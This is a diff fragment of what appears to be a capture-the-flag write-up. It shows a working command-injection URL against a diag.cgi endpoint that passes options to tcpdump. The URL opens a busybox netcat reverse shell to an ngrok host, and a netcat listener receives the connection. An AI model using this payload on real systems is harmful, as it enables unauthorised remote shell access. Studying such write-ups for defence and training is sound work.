@@ -59,7 +59,7 @@ return $options if system("timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/nul
 # Final works
 `http://13.231.137.9/cgi-bin/diag.cgi?options=-r$x="/bin/busybox nc 0.tcp.ap.ngrok.io 12523 -e /bin/sh",system$x%23 2>/usr/lib/cgi-bin/tmp/vinhjaxt.thtml <&tpl=vinhjaxt`
 ```bash
-nc -nvlp 4444
+$ nc -nvlp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34036
 whoami
